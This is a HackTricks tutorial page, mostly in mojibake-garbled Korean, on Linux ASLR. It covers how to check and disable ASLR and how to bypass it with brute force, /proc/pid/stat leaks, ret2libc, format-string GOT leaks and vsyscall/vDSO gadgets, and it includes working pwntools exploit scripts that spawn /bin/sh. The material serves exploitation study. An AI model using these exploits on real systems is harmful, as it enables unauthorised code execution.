# ASLR

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

**ì£¼ì†Œ ê³µê°„ ë ˆì´ì•„ì›ƒ ë¬´ì‘ìœ„í™” (ASLR)**ëŠ” ìš´ì˜ ì²´ì œì—ì„œ **ì‹œìŠ¤í…œ ë° ì• í”Œë¦¬ì¼€ì´ì…˜ í”„ë¡œì„¸ìŠ¤**ê°€ ì‚¬ìš©í•˜ëŠ” ë©”ëª¨ë¦¬ ì£¼ì†Œë¥¼ ë¬´ì‘ìœ„í™”í•˜ëŠ” ë³´ì•ˆ ê¸°ìˆ ì…ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìê°€ íŠ¹ì • í”„ë¡œì„¸ìŠ¤ì™€ ë°ì´í„°(ì˜ˆ: ìŠ¤íƒ, í™ ë° ë¼ì´ë¸ŒëŸ¬ë¦¬)ì˜ ìœ„ì¹˜ë¥¼ ì˜ˆì¸¡í•˜ê¸°ê°€ í›¨ì”¬ ë” ì–´ë ¤ì›Œì§€ë©°, íŠ¹ì • ìœ í˜•ì˜ ìµìŠ¤í”Œë¡œì‡, íŠ¹íˆ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ì™„í™”í•©ë‹ˆë‹¤.

### **ASLR ìƒíƒœ í™•ì¸**

Linux ì‹œìŠ¤í…œì—ì„œ **ASLR ìƒíƒœë¥¼ í™•ì¸**í•˜ë ¤ë©´ **`/proc/sys/kernel/randomize_va_space`** íŒŒì¼ì—ì„œ ê°’ì„ ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ íŒŒì¼ì— ì €ì¥ëœ ê°’ì€ ì ìš©ë˜ëŠ” ASLR ìœ í˜•ì„ ê²°ì •í•©ë‹ˆë‹¤:

* **0**: ë¬´ì‘ìœ„í™” ì—†ìŒ. ëª¨ë“  ê²ƒì´ ì •ì ì…ë‹ˆë‹¤.
* **1**: ë³´ìˆ˜ì ì¸ ë¬´ì‘ìœ„í™”. ê³µìœ  ë¼ì´ë¸ŒëŸ¬ë¦¬, ìŠ¤íƒ, mmap(), VDSO í˜ì´ì§€ê°€ ë¬´ì‘ìœ„í™”ë©ë‹ˆë‹¤.
* **2**: ì™„ì „ ë¬´ì‘ìœ„í™”. ë³´ìˆ˜ì ì¸ ë¬´ì‘ìœ„í™”ì— ì˜í•´ ë¬´ì‘ìœ„í™”ëœ ìš”ì†Œ ì™¸ì—ë„ `brk()`ë¥¼ í†µí•´ ê´€ë¦¬ë˜ëŠ” ë©”ëª¨ë¦¬ê°€ ë¬´ì‘ìœ„í™”ë©ë‹ˆë‹¤.

ë‹¤ìŒ ëª…ë ¹ì–´ë¡œ ASLR ìƒíƒœë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **ASLR ë¹„í™œì„±í™”**

ASLRë¥¼ **ë¹„í™œì„±í™”**í•˜ë ¤ë©´ `/proc/sys/kernel/randomize_va_space`ì˜ ê°’ì„ **0**ìœ¼ë¡œ ì„¤ì •í•©ë‹ˆë‹¤. ASLR ë¹„í™œì„±í™”ëŠ” ì¼ë°˜ì ìœ¼ë¡œ í…ŒìŠ¤íŠ¸ë‚˜ ë””ë²„ê¹… ì‹œë‚˜ë¦¬ì˜¤ ì™¸ì—ëŠ” ê¶Œì¥ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ASLRì„ ë¹„í™œì„±í™”í•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
You can also disable ASLR for an execution with:  
ASLRë¥¼ ì‹¤í–‰ì— ëŒ€í•´ ë¹„í™œì„±í™”í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **ASLR í™œì„±í™”**

ASLRë¥¼ **í™œì„±í™”**í•˜ë ¤ë©´ `/proc/sys/kernel/randomize_va_space` íŒŒì¼ì— **2** ê°’ì„ ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ì¼ë°˜ì ìœ¼ë¡œ ë£¨íŠ¸ ê¶Œí•œì´ í•„ìš”í•©ë‹ˆë‹¤. ì „ì²´ ë¬´ì‘ìœ„í™”ë¥¼ í™œì„±í™”í•˜ë ¤ë©´ ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **ì¬ë¶€íŒ… ê°„ ì§€ì†ì„±**

`echo` ëª…ë ¹ì–´ë¡œ ë³€ê²½í•œ ë‚´ìš©ì€ ì¼ì‹œì ì´ë©° ì¬ë¶€íŒ… ì‹œ ì´ˆê¸°í™”ë©ë‹ˆë‹¤. ë³€ê²½ ì‚¬í•­ì„ ì§€ì†ì ìœ¼ë¡œ ìœ ì§€í•˜ë ¤ë©´ `/etc/sysctl.conf` íŒŒì¼ì„ í¸ì§‘í•˜ê³  ë‹¤ìŒ ì¤„ì„ ì¶”ê°€í•˜ê±°ë‚˜ ìˆ˜ì •í•´ì•¼ í•©ë‹ˆë‹¤:
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
`/etc/sysctl.conf` íŒŒì¼ì„ í¸ì§‘í•œ í›„, ë‹¤ìŒ ëª…ë ¹ì–´ë¡œ ë³€ê²½ ì‚¬í•­ì„ ì ìš©í•©ë‹ˆë‹¤:
```bash
sudo sysctl -p
```
This will ensure that your ASLR settings remain across reboots.

## **ìš°íšŒ ë°©ë²•**

### 32ë¹„íŠ¸ ë¬´ì°¨ë³„ ëŒ€ì…

PaXëŠ” í”„ë¡œì„¸ìŠ¤ ì£¼ì†Œ ê³µê°„ì„ **3 ê·¸ë£¹**ìœ¼ë¡œ ë‚˜ëˆ•ë‹ˆë‹¤:

* **ì½”ë“œì™€ ë°ì´í„°** (ì´ˆê¸°í™”ëœ ê²ƒê³¼ ì´ˆê¸°í™”ë˜ì§€ ì•Šì€ ê²ƒ): `.text`, `.data`, ê·¸ë¦¬ê³  `.bss` â€”> `delta_exec` ë³€ìˆ˜ì—ì„œ **16ë¹„íŠ¸**ì˜ ì—”íŠ¸ë¡œí”¼. ì´ ë³€ìˆ˜ëŠ” ê° í”„ë¡œì„¸ìŠ¤ì™€ í•¨ê»˜ ë¬´ì‘ìœ„ë¡œ ì´ˆê¸°í™”ë˜ë©° ì´ˆê¸° ì£¼ì†Œì— ì¶”ê°€ë©ë‹ˆë‹¤.
* `mmap()`ì— ì˜í•´ í• ë‹¹ëœ **ë©”ëª¨ë¦¬**ì™€ **ê³µìœ  ë¼ì´ë¸ŒëŸ¬ë¦¬** â€”> **16ë¹„íŠ¸**, `delta_mmap`ì´ë¼ê³  ë¶ˆë¦½ë‹ˆë‹¤.
* **ìŠ¤íƒ** â€”> **24ë¹„íŠ¸**, `delta_stack`ì´ë¼ê³  í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì‹¤ì œë¡œëŠ” **11ë¹„íŠ¸**ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤ (10ë²ˆì§¸ ë°”ì´íŠ¸ë¶€í„° 20ë²ˆì§¸ ë°”ì´íŠ¸ê¹Œì§€ í¬í•¨), **16ë°”ì´íŠ¸**ì— ì •ë ¬ë©ë‹ˆë‹¤ â€”> ì´ë¡œ ì¸í•´ **524,288ê°œì˜ ê°€ëŠ¥í•œ ì‹¤ì œ ìŠ¤íƒ ì£¼ì†Œ**ê°€ ìƒì„±ë©ë‹ˆë‹¤.

ì´ì „ ë°ì´í„°ëŠ” 32ë¹„íŠ¸ ì‹œìŠ¤í…œì— í•´ë‹¹í•˜ë©°, ìµœì¢… ì—”íŠ¸ë¡œí”¼ê°€ ì¤„ì–´ë“¤ì–´ ASLRì„ ìš°íšŒí•˜ê¸° ìœ„í•´ ì‹¤í–‰ì„ ë°˜ë³µí•˜ì—¬ ìµìŠ¤í”Œë¡œì‡ì´ ì„±ê³µì ìœ¼ë¡œ ì™„ë£Œë  ë•Œê¹Œì§€ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### ë¬´ì°¨ë³„ ëŒ€ì… ì•„ì´ë””ì–´:

* ì‰˜ì½”ë“œ ì•ì— **í° NOP ìŠ¬ë ˆë“œ**ë¥¼ í˜¸ìŠ¤íŒ…í•  ìˆ˜ ìˆì„ ë§Œí¼ í° ì˜¤ë²„í”Œë¡œìš°ê°€ ìˆë‹¤ë©´, ìŠ¤íƒì—ì„œ ì£¼ì†Œë¥¼ ë¬´ì‘ìœ„ë¡œ ëŒ€ì…í•˜ì—¬ íë¦„ì´ **NOP ìŠ¬ë ˆë“œì˜ ì¼ë¶€ë¥¼ ë„˜ì–´ê°€ë„ë¡** í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ì˜¤ë²„í”Œë¡œìš°ê°€ ê·¸ë¦¬ í¬ì§€ ì•Šê³  ìµìŠ¤í”Œë¡œì‡ì„ ë¡œì»¬ì—ì„œ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ê²½ìš°, **í™˜ê²½ ë³€ìˆ˜ì— NOP ìŠ¬ë ˆë“œì™€ ì‰˜ì½”ë“œë¥¼ ì¶”ê°€í•˜ëŠ”** ì˜µì…˜ì´ ìˆìŠµë‹ˆë‹¤.
* ìµìŠ¤í”Œë¡œì‡ì´ ë¡œì»¬ì¸ ê²½ìš°, libcì˜ ê¸°ë³¸ ì£¼ì†Œë¥¼ ë¬´ì‘ìœ„ë¡œ ëŒ€ì…í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (32ë¹„íŠ¸ ì‹œìŠ¤í…œì— ìœ ìš©í•¨):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* ì›ê²© ì„œë²„ë¥¼ ê³µê²©í•˜ëŠ” ê²½ìš°, **`libc` í•¨ìˆ˜ `usleep`ì˜ ì£¼ì†Œë¥¼ ë¸Œë£¨íŠ¸ í¬ìŠ¤** ì‹œë„í•  ìˆ˜ ìˆìœ¼ë©°, ì¸ìˆ˜ë¡œ 10ì„ ì „ë‹¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ì˜ˆ:). ë§Œì•½ ì–´ëŠ ì‹œì ì—ì„œ **ì„œë²„ê°€ ì‘ë‹µí•˜ëŠ” ë° 10ì´ˆê°€ ì¶”ê°€ë¡œ ê±¸ë¦°ë‹¤ë©´**, ì´ í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ì°¾ì€ ê²ƒì…ë‹ˆë‹¤.

{% hint style="success" %}
64ë¹„íŠ¸ ì‹œìŠ¤í…œì—ì„œëŠ” ì—”íŠ¸ë¡œí”¼ê°€ í›¨ì”¬ ë†’ì•„ì§€ë©°, ì´ëŠ” ë¶ˆê°€ëŠ¥í•´ì•¼ í•©ë‹ˆë‹¤.
{% endhint %}

### 64ë¹„íŠ¸ ìŠ¤íƒ ë¸Œë£¨íŠ¸ í¬ìŠ¤

í™˜ê²½ ë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ìŠ¤íƒì˜ í° ë¶€ë¶„ì„ ì°¨ì§€í•œ ë‹¤ìŒ, ì´ë¥¼ ì•…ìš©í•˜ê¸° ìœ„í•´ ë¡œì»¬ì—ì„œ ìˆ˜ë°±/ìˆ˜ì²œ ë²ˆ ì´ì§„ íŒŒì¼ì„ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë‹¤ìŒ ì½”ë“œëŠ” **ìŠ¤íƒì—ì„œ ì£¼ì†Œë¥¼ ì„ íƒí•˜ëŠ” ê²ƒë§Œìœ¼ë¡œ** ê°€ëŠ¥í•˜ë©°, **ëª‡ ë°± ë²ˆì˜ ì‹¤í–‰**ë§ˆë‹¤ í•´ë‹¹ ì£¼ì†ŒëŠ” **NOP ëª…ë ¹ì–´**ë¥¼ í¬í•¨í•˜ê²Œ ë©ë‹ˆë‹¤:
```c
//clang -o aslr-testing aslr-testing.c -fno-stack-protector -Wno-format-security -no-pie
#include <stdio.h>

int main() {
unsigned long long address = 0xffffff1e7e38;
unsigned int* ptr = (unsigned int*)address;
unsigned int value = *ptr;
printf("The 4 bytes from address 0xffffff1e7e38: 0x%x\n", value);
return 0;
}
```

```python
import subprocess
import traceback

# Start the process
nop = b"\xD5\x1F\x20\x03" # ARM64 NOP transposed
n_nops = int(128000/4)
shellcode_env_var = nop * n_nops

# Define the environment variables you want to set
env_vars = {
'a': shellcode_env_var,
'b': shellcode_env_var,
'c': shellcode_env_var,
'd': shellcode_env_var,
'e': shellcode_env_var,
'f': shellcode_env_var,
'g': shellcode_env_var,
'h': shellcode_env_var,
'i': shellcode_env_var,
'j': shellcode_env_var,
'k': shellcode_env_var,
'l': shellcode_env_var,
'm': shellcode_env_var,
'n': shellcode_env_var,
'o': shellcode_env_var,
'p': shellcode_env_var,
}

cont = 0
while True:
cont += 1

if cont % 10000 == 0:
break

print(cont, end="\r")
# Define the path to your binary
binary_path = './aslr-testing'

try:
process = subprocess.Popen(binary_path, env=env_vars, stdout=subprocess.PIPE, text=True)
output = process.communicate()[0]
if "0xd5" in str(output):
print(str(cont) + " -> " + output)
except Exception as e:
print(e)
print(traceback.format_exc())
pass
```
<figure><img src="../../../.gitbook/assets/image (1214).png" alt="" width="563"><figcaption></figcaption></figure>

### ë¡œì»¬ ì •ë³´ (`/proc/[pid]/stat`)

í”„ë¡œì„¸ìŠ¤ì˜ íŒŒì¼ **`/proc/[pid]/stat`**ëŠ” í•­ìƒ ëª¨ë“  ì‚¬ìš©ìê°€ ì½ì„ ìˆ˜ ìˆìœ¼ë©°, **í¥ë¯¸ë¡œìš´** ì •ë³´ê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤:

* **startcode** & **endcode**: ë°”ì´ë„ˆë¦¬ì˜ **TEXT** ìœ„ì™€ ì•„ë˜ì˜ ì£¼ì†Œ
* **startstack**: **ìŠ¤íƒ** ì‹œì‘ì˜ ì£¼ì†Œ
* **start\_data** & **end\_data**: **BSS** ìœ„ì™€ ì•„ë˜ì˜ ì£¼ì†Œ
* **kstkesp** & **kstkeip**: í˜„ì¬ **ESP** ë° **EIP** ì£¼ì†Œ
* **arg\_start** & **arg\_end**: **cli arguments** ìœ„ì™€ ì•„ë˜ì˜ ì£¼ì†Œ
* **env\_start** &**env\_end**: **env variables** ìœ„ì™€ ì•„ë˜ì˜ ì£¼ì†Œ

ë”°ë¼ì„œ, ê³µê²©ìê°€ ì•…ìš©ë˜ëŠ” ë°”ì´ë„ˆë¦¬ì™€ ë™ì¼í•œ ì»´í“¨í„°ì— ìˆê³  ì´ ë°”ì´ë„ˆë¦¬ê°€ ì›ì‹œ ì¸ìˆ˜ì—ì„œ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ê¸°ëŒ€í•˜ì§€ ì•Šì§€ë§Œ, ì´ íŒŒì¼ì„ ì½ì€ í›„ì— ì¡°ì‘í•  ìˆ˜ ìˆëŠ” ë‹¤ë¥¸ **ì…ë ¥**ì—ì„œ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ê¸°ëŒ€í•˜ëŠ” ê²½ìš°, ê³µê²©ìëŠ” **ì´ íŒŒì¼ì—ì„œ ì¼ë¶€ ì£¼ì†Œë¥¼ ê°€ì ¸ì™€ì„œ ì´ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ì˜¤í”„ì…‹ì„ êµ¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

{% hint style="success" %}
ì´ íŒŒì¼ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” [https://man7.org/linux/man-pages/man5/proc.5.html](https://man7.org/linux/man-pages/man5/proc.5.html)ì—ì„œ `/proc/pid/stat`ë¥¼ ê²€ìƒ‰í•˜ì—¬ í™•ì¸í•˜ì„¸ìš”.
{% endhint %}

### ëˆ„ìˆ˜ ë°œìƒ

* **ë¬¸ì œëŠ” ëˆ„ìˆ˜ë¥¼ ì œê³µí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤**

ëˆ„ìˆ˜ë¥¼ ì œê³µë°›ìœ¼ë©´(ì‰¬ìš´ CTF ë„ì „ ê³¼ì œ), ì´ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ì˜¤í”„ì…‹ì„ ê³„ì‚°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ì˜ˆë¥¼ ë“¤ì–´, ê³µê²©í•˜ëŠ” ì‹œìŠ¤í…œì—ì„œ ì‚¬ìš©ë˜ëŠ” ì •í™•í•œ libc ë²„ì „ì„ ì•Œê³  ìˆë‹¤ê³  ê°€ì •í•  ë•Œ). ì´ ì˜ˆì œ ìµìŠ¤í”Œë¡œì‡ì€ [**ì—¬ê¸°ì—ì„œì˜ ì˜ˆì œ**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak)ì—ì„œ ë°œì·Œí•œ ê²ƒì…ë‹ˆë‹¤(ìì„¸í•œ ë‚´ìš©ì€ í•´ë‹¹ í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì„¸ìš”):
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
* **ret2plt**

ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ì•…ìš©í•˜ì—¬ **ret2plt**ë¥¼ ì´ìš©í•´ libcì˜ í•¨ìˆ˜ ì£¼ì†Œë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í™•ì¸í•´ë³´ì„¸ìš”:

{% content-ref url="ret2plt.md" %}
[ret2plt.md](ret2plt.md)
{% endcontent-ref %}

* **Format Strings Arbitrary Read**

ret2pltì™€ ë§ˆì°¬ê°€ì§€ë¡œ, í¬ë§· ë¬¸ìì—´ ì·¨ì•½ì ì„ í†µí•´ ì„ì˜ì˜ ì½ê¸°ê°€ ê°€ëŠ¥í•˜ë‹¤ë©´ GOTì—ì„œ **libc í•¨ìˆ˜**ì˜ ì£¼ì†Œë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒ [**ì˜ˆì‹œëŠ” ì—¬ê¸°ì—ì„œ ê°€ì ¸ì˜¨ ê²ƒì…ë‹ˆë‹¤**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
You can find more info about Format Strings arbitrary read in:

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

### Ret2ret & Ret2pop

ASLRë¥¼ ìš°íšŒí•˜ê¸° ìœ„í•´ ìŠ¤íƒ ë‚´ì˜ ì£¼ì†Œë¥¼ ì•…ìš©í•´ ë³´ì„¸ìš”:

{% content-ref url="ret2ret.md" %}
[ret2ret.md](ret2ret.md)
{% endcontent-ref %}

### vsyscall

**`vsyscall`** ë©”ì»¤ë‹ˆì¦˜ì€ íŠ¹ì • ì‹œìŠ¤í…œ í˜¸ì¶œì´ ì‚¬ìš©ì ê³µê°„ì—ì„œ ì‹¤í–‰ë  ìˆ˜ ìˆë„ë¡ í•˜ì—¬ ì„±ëŠ¥ì„ í–¥ìƒì‹œí‚¤ëŠ” ì—­í• ì„ í•©ë‹ˆë‹¤. ì´ë“¤ì€ ê·¼ë³¸ì ìœ¼ë¡œ ì»¤ë„ì˜ ì¼ë¶€ì…ë‹ˆë‹¤. **vsyscall**ì˜ ì£¼ìš” ì¥ì ì€ **ASLR**(ì£¼ì†Œ ê³µê°„ ë°°ì¹˜ ë¬´ì‘ìœ„í™”)ì˜ ì˜í–¥ì„ ë°›ì§€ ì•ŠëŠ” **ê³ ì • ì£¼ì†Œ**ì— ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ê³ ì •ëœ íŠ¹ì„± ë•ë¶„ì— ê³µê²©ìëŠ” ì£¼ì†Œë¥¼ ê²°ì •í•˜ê³  ì´ë¥¼ ìµìŠ¤í”Œë¡œì‡ì— ì‚¬ìš©í•  ì •ë³´ ìœ ì¶œ ì·¨ì•½ì ì´ í•„ìš”í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.\
ê·¸ëŸ¬ë‚˜ ì—¬ê¸°ì—ì„œ ë§¤ìš° í¥ë¯¸ë¡œìš´ ê°€ì ¯ì€ ë°œê²¬ë˜ì§€ ì•Šì„ ê²ƒì…ë‹ˆë‹¤(ì˜ˆë¥¼ ë“¤ì–´ `ret;`ì™€ ë™ë“±í•œ ê²ƒì„ ì–»ëŠ” ê²ƒì€ ê°€ëŠ¥í•˜ì§€ë§Œ).

(ë‹¤ìŒ ì˜ˆì œì™€ ì½”ë“œëŠ” [**ì´ ì‘ì„±ë¬¼ì—ì„œ**](https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html#exploitation) ê°€ì ¸ì˜¨ ê²ƒì…ë‹ˆë‹¤)

ì˜ˆë¥¼ ë“¤ì–´, ê³µê²©ìëŠ” ìµìŠ¤í”Œë¡œì‡ ë‚´ì—ì„œ ì£¼ì†Œ `0xffffffffff600800`ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `ret` ëª…ë ¹ì–´ë¡œ ì§ì ‘ ì í”„í•˜ë ¤ê³  í•˜ë©´ ëª‡ ê°œì˜ ê°€ì ¯ì„ ì‹¤í–‰í•œ í›„ ë¶ˆì•ˆì •ì„±ì´ë‚˜ ì¶©ëŒì´ ë°œìƒí•  ìˆ˜ ìˆì§€ë§Œ, **vsyscall** ì„¹ì…˜ì—ì„œ ì œê³µí•˜ëŠ” `syscall`ì˜ ì‹œì‘ìœ¼ë¡œ ì í”„í•˜ëŠ” ê²ƒì€ ì„±ê³µì ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ **vsyscall** ì£¼ì†Œë¡œ ì‹¤í–‰ì„ ì´ë„ëŠ” **ROP** ê°€ì ¯ì„ ì‹ ì¤‘í•˜ê²Œ ë°°ì¹˜í•¨ìœ¼ë¡œì¨, ê³µê²©ìëŠ” ì´ ìµìŠ¤í”Œë¡œì‡ì˜ ì´ ë¶€ë¶„ì— ëŒ€í•´ **ASLR**ë¥¼ ìš°íšŒí•  í•„ìš” ì—†ì´ ì½”ë“œ ì‹¤í–‰ì„ ë‹¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```
efâ¤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555556000 0x0000000000000000 r-x /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555755000 0x0000555555756000 0x0000000000001000 rw- /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555756000 0x0000555555777000 0x0000000000000000 rw- [heap]
0x00007ffff7dcc000 0x00007ffff7df1000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df1000 0x00007ffff7f64000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f64000 0x00007ffff7fad000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fad000 0x00007ffff7fb0000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb0000 0x00007ffff7fb3000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb3000 0x00007ffff7fb9000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefâ¤  x.g <pre> 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
A syntax error in expression, near `.g <pre> 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]'.
gefâ¤  x/8g 0xffffffffff600000
0xffffffffff600000:    0xf00000060c0c748    0xccccccccccccc305
0xffffffffff600010:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600020:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600030:    0xcccccccccccccccc    0xcccccccccccccccc
gefâ¤  x/4i 0xffffffffff600800
0xffffffffff600800:    mov    rax,0x135
0xffffffffff600807:    syscall
0xffffffffff600809:    ret
0xffffffffff60080a:    int3
gefâ¤  x/4i 0xffffffffff600800
0xffffffffff600800:    mov    rax,0x135
0xffffffffff600807:    syscall
0xffffffffff600809:    ret
0xffffffffff60080a:    int3
```
### vDSO

ë”°ë¼ì„œ ì»¤ë„ì´ CONFIG\_COMPAT\_VDSOë¡œ ì»´íŒŒì¼ëœ ê²½ìš° **vdsoë¥¼ ì•…ìš©í•˜ì—¬ ASLRì„ ìš°íšŒí•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. vdso ì£¼ì†ŒëŠ” ë¬´ì‘ìœ„í™”ë˜ì§€ ì•Šê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ë” ë§ì€ ì •ë³´ëŠ” ë‹¤ìŒì„ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="../../rop-return-oriented-programing/ret2vdso.md" %}
[ret2vdso.md](../../rop-return-oriented-programing/ret2vdso.md)
{% endcontent-ref %}

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
